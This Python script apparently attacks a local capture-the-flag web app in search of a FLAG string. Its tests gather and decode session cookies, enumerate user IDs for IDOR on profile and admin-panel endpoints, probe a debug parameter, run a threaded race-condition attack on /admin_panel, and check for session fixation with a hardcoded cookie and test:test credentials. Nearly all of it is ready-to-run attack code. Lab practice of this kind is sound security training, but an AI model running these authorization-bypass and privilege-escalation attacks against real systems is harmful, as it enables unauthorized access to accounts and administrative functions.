import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "http://127.0.0.1:32831"
headers = {"User-Agent": "Security-Tester/1.0"}

print("=" * 80)
print("AUTHORIZATION BYPASS & PRIVILEGE ESCALATION TESTING")
print("=" * 80)

# Test 1: Session ID Pattern Analysis
print("\n[TEST 1] Session ID Pattern Analysis")
print("-" * 80)
session_ids = []
for i in range(5):
    try:
        resp = requests.get(f"{base_url}/login", headers=headers, timeout=10)
        session_cookie = resp.cookies.get('session')
        if session_cookie:
            session_ids.append(session_cookie)
            print(f"Session {i+1}: {session_cookie}")
            print(f"  Length: {len(session_cookie)}")
            print(f"  URL-Safe Base64: {bool(re.match('^[A-Za-z0-9_\-]+$', session_cookie))}")
    except Exception as e:
        print(f"Error getting session {i+1}: {e}")

if len(session_ids) > 1:
    print(f"\n[ANALYSIS] Generated {len(session_ids)} sessions")
    print(f"Unique sessions: {len(set(session_ids))}")
    if len(set(session_ids)) < len(session_ids):
        print("[!] DUPLICATE SESSIONS DETECTED - Possible session fixation!")
    
    # Check for patterns
    for i, sid in enumerate(session_ids):
        decoded = None
        try:
            import base64
            padded = sid + '=' * (4 - len(sid) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f"\nSession {i+1} decoded ({len(decoded)} bytes): {decoded[:50]}...")
        except Exception as e:
            print(f"\nSession {i+1} decode error: {e}")

# Test 2: User ID Enumeration (1-50)
print("\n\n[TEST 2] User ID Enumeration (1-50)")
print("-" * 80)
found_users = []
suspicious_responses = []

for user_id in range(1, 51):
    try:
        resp = requests.get(
            f"{base_url}/profile?user_id={user_id}",
            headers=headers,
            cookies={"session": "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"},
            timeout=5
        )
        
        # Look for admin indicators
        if re.search(r'admin|role|privilege|Administrator|ROLE_', resp.text, re.I):
            print(f"\n[!] ADMIN INDICATOR FOUND at user_id={user_id}")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            found_users.append({"id": user_id, "status": resp.status_code, "response": resp.text[:500]})
        
        # Check for different response patterns
        if resp.status_code != 404 and resp.status_code != 403:
            content_length = len(resp.content)
            if content_length > 100:  # Non-empty responses
                suspicious_responses.append((user_id, resp.status_code, content_length))
        
        if user_id % 10 == 0:
            print(f"Progress: Tested {user_id}/50 user IDs...")
            
    except Exception as e:
        print(f"Error testing user_id={user_id}: {e}")

print(f"\n[RESULTS] Found {len(suspicious_responses)} non-empty responses")
for uid, status, length in suspicious_responses[:10]:
    print(f"  user_id={uid}: status={status}, length={length}B")

# Test 3: Debug Parameter on All Endpoints
print("\n\n[TEST 3] Debug Parameter Testing")
print("-" * 80)
endpoints = ["/wifi_settings", "/dashboard", "/login", "/server-status"]
for endpoint in endpoints:
    print(f"\nTesting {endpoint}?debug=session")
    try:
        resp = requests.get(
            f"{base_url}{endpoint}?debug=session",
            headers=headers,
            cookies={"session": "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"},
            timeout=10
        )
        print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Search for session data or admin info
        if re.search(r'session|user_id|role|admin|privilege|debug', resp.text, re.I):
            print(f"  [!] DEBUG INFO FOUND:")
            # Print relevant lines
            lines = resp.text.split('\n')
            for line in lines:
                if any(kw in line.lower() for kw in ['session', 'user_id', 'role', 'admin', 'debug']):
                    print(f"    {line[:200]}")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"\n[!!!] FLAG FOUND: {flag_match.group()}")
        
    except Exception as e:
        print(f"  Error: {e}")

# Test 4: Admin Panel Access with Different User IDs
print("\n\n[TEST 4] Admin Panel Access Tests")
print("-" * 80)
admin_uid_found = None
for uid in [1] + list(range(1, 51)):
    try:
        # Try to access admin panel with different user_id parameters
        resp = requests.get(
            f"{base_url}/admin_panel?user_id={uid}",
            headers=headers,
            cookies={"session": "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"},
            timeout=5
        )
        
        if resp.status_code == 200 and len(resp.content) > 100:
            print(f"\n[!] ADMIN PANEL ACCESS at user_id={uid}")
            print(f"Status: {resp.status_code} | Length: {len(resp.content)}B")
            admin_uid_found = uid
            
            # Check for admin indicators
            if re.search(r'admin|role|privilege|panel|control', resp.text, re.I):
                print("[!] Admin keywords detected in response!")
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"\n[!!!] FLAG FOUND: {flag_match.group()}")
                break
            
            # Print first 500 chars
            print(f"Response preview:\n{resp.text[:500]}")
        
        if uid % 10 == 0:
            print(f"Progress: Tested {uid}/50 user IDs for admin access...")
            
    except Exception as e:
        print(f"Error testing admin_panel with user_id={uid}: {e}")

# Test 5: TOCTOU Race Condition on Admin Panel
print("\n\n[TEST 5] TOCTOU Race Condition Test")
print("-" * 80)
print("Sending rapid alternating authenticated/unauthenticated requests...")

def req_auth():
    return requests.get(
        f"{base_url}/admin_panel",
        headers=headers,
        cookies={"session": "bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY"},
        timeout=5
    )

def req_no_auth():
    return requests.get(
        f"{base_url}/admin_panel",
        headers=headers,
        timeout=5
    )

results = []
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    for i in range(50):
        if i % 2 == 0:
            futures.append(executor.submit(req_auth))
        else:
            futures.append(executor.submit(req_no_auth))
    
    for future in as_completed(futures):
        try:
            resp = future.result()
            results.append(resp.status_code)
            if resp.status_code == 200 and len(resp.content) > 500:
                print(f"\n[!] TOCTOU SUCCESS! Status: {resp.status_code}")
                print(f"Length: {len(resp.content)}B")
                print(f"Response:\n{resp.text[:500]}")
                
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"\n[!!!] FLAG FOUND: {flag_match.group()}")
        except Exception as e:
            print(f"Request error: {e}")

print(f"\nRace condition test complete. Status codes: {set(results)}")

# Test 6: Session Fixation Test
print("\n\n[TEST 6] Session Fixation Test")
print("-" * 80)
print("Step 1: Get session before login...")

try:
    # Get session before login
    pre_login = requests.get(f"{base_url}/login", headers=headers, timeout=10)
    pre_login_session = pre_login.cookies.get('session')
    print(f"Pre-login session: {pre_login_session}")
    
    # Login with test credentials
    print("\nStep 2: Login with test:test...")
    login_resp = requests.post(
        f"{base_url}/login",
        headers=headers,
        data={"username": "test", "password": "test"},
        timeout=10
    )
    post_login_session = login_resp.cookies.get('session')
    print(f"Post-login session: {post_login_session}")
    
    # Check if session changed
    if pre_login_session == post_login_session:
        print("[!] SESSION FIXATION VULNERABILITY DETECTED!")
        print("Session ID did not change after login - TOCTOU indicator")
    else:
        print("[+] Session changed after login (good security practice)")
    
    # Test if old session still works
    if pre_login_session:
        test_resp = requests.get(
            f"{base_url}/dashboard",
            headers=headers,
            cookies={"session": pre_login_session},
            timeout=5
        )
        if test_resp.status_code == 200:
            print(f"[!] OLD SESSION STILL VALID - Security issue!")
            print(f"Old session can access dashboard: {test_resp.status_code}")
        else:
            print(f"[+] Old session invalidated: {test_resp.status_code}")
            
except Exception as e:
    print(f"Session fixation test error: {e}")

# Final summary - Search all responses for admin indicators
print("\n\n[FINAL ANALYSIS] Searching for Admin Role Indicators")
print("=" * 80)
admin_keywords = ['admin', 'role', 'privilege', 'moderator', 'superuser', 'authority', 'permission']
print(f"Searching for keywords: {admin_keywords}")

# Compile all test results for admin indicators
print("\nRecommendations:")
print("1. Check if any user_id in range 1-50 has admin privileges")
print("2. Analyze session structure for role encoding")
print("3. Test timing attacks on /admin_panel")
print("4. Look for debug info disclosure")
print("5. Check for IDOR in user_id parameter")
